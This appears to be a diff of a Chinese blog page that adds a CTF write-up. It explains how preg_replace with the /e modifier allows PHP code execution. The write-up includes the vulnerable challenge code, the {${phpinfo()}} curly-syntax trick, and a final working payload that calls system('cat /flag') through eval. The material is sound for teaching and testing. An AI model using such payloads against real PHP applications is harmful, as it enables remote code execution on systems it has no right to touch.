@@ -494,6 +494,32 @@ foreach($_GET as $re =&gt; $str) &#123;
 function getFlag()&#123;
     @eval($_GET[&#39;cmd&#39;]);
 &#125;</code></pre>
+<p>这一点，猜测一定要触发getflag（）函数，那么问题的点一定在complex这个函数这里，初步想法是在complex这里构造出来getflag</p>
+<p>先说return preg_replace(<br>           ‘/(‘ . $re . ‘)/ei’,<br>           ‘strtolower(“\1”)’,<br>           $str<br>        );</p>
+<p>preg_replace可能会导致命令执行。</p>
+<pre><code>foreach ($_GET as $regex =&gt; $value) &#123;
+    preg_replace(&#39;/(&#39; . $regex . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$value);
+&#125;</code></pre>
+<p>s_———————————————–{${phpinfo()}}———————————————–{${phpinfo()}} </p>
+<p>可以看到我们输入的是S+但是数出来变成s_</p>
+<p>php自身在解析请求的时候，如果参数名字中包含空格、.、[等字符，会将他们转换成_。</p>
+<p>如果在preg_replace中使用/e修饰符，会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行，前提是 subject 中有 pattern 的匹配</p>
+<p><img src="1.png" class="lazyload" data-srcset="1.png" srcset="data:image/png;base64,666"></p>
+<p>图中实际上通过 eval 执行的是 strtolower 函数。分别实际执行的是：</p>
+<p>strtolower(“JUST TEST”);</p>
+<p>strtolower(“PHPINFO()”);</p>
+<p>strtolower(“{${PHPINFO()}}”);</p>
+<p>第三个之所以可以执行代码，是因为我们通过复杂（花括号）语法的方式来让其代码执行。</p>
+<p>回到源代码中，我们再理解一下：</p>
+<pre><code>   foreach ($_GET as $regex =&gt; $value) &#123;
+    preg_replace(&#39;/(&#39; . $regex . &#39;)/ei&#39;,&#39;strtolower(&quot;\\1&quot;)&#39;,$value);
+&#125;</code></pre>
+<p>这里的 replacement 是 strtolower(“\1”) ，着重理解一下 \1 。</p>
+<p>每个这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n可以是0-99，\0和$0代表完整的模式匹配文本。</p>
+<p>这里的 $1$2$4 等同于上面的 \1\2\4 的作用，因此我们看一下是怎么选择匹配的。</p>
+<p>$1 $2   $3 $4<br>‘/(.<em>)(?|&amp;)’ . $key . ‘=[^&amp;]+?(&amp;)(.</em>)/i’</p>
+<p>回到题目</p>
+<p>最后构造<br>?\S*=${getFlag()}&amp;cmd=system(‘cat /flag’);得到flag</p>
 
   
   
@@ -528,7 +554,7 @@ function getFlag()&#123;
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-01T18:19:50+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-01T21:12:15+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：Mar 1, 2021</p>
@@ -603,6 +629,20 @@ function getFlag()&#123;
 
   
     <div class="prev-next">
+      
+        <a class='prev' href='/2021/03/01/%E7%88%AC%E8%99%AB/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>爬虫</p>
+          <p class='content'>
+
+
+1.搜狗
+
+2.百度翻译
+
+3.豆瓣
+
+</p>
+        </a>
       
       
         <a class='next' href='/2021/02/28/web/'>
